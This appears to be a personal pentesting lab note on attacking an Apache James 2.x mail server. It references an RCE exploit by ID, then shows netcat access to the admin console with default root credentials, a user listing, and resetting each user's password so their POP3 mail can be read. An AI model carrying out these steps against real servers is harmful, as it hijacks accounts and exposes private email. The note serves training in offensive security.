#### 35513 RCE
exploit 35513.py

#### Manual
```bash - kali
nc -nvC $TARGET 4555
```

[https://james.apache.org/server/archive/configuration_v2_0.html](https://james.apache.org/server/archive/configuration_v2_0.html)

```bash - kali
root
```

```bash - kali
root
```
   
```bash - kali
HELP
```

```bash - kali
listusers
```

We do not have the ability to view user credentials. However can do the next best thing: we can change them with the setpassword command. Once we do so, we should be able to log onto the POP3 server and see if there are any emails available. We'll go ahead and change all the user credentials and then log on one by one.

```bash - kali
setpassword alice abcd
```

```bash - kali
setpassword bob abcd
```

```bash - kali
setpassword carlos abcd
```

```bash - kali
setpassword david abcd
```

```bash - kali
setpassword earl abcd
```

```bash - kali
setpassword frank abcd
```

```bash - kali
quit
```

While we could login one-by-one with our newly controlled credentials, we might as well use a little bash in order to speed up the process.

![[Port 110 - POP3#POP3 sh]]

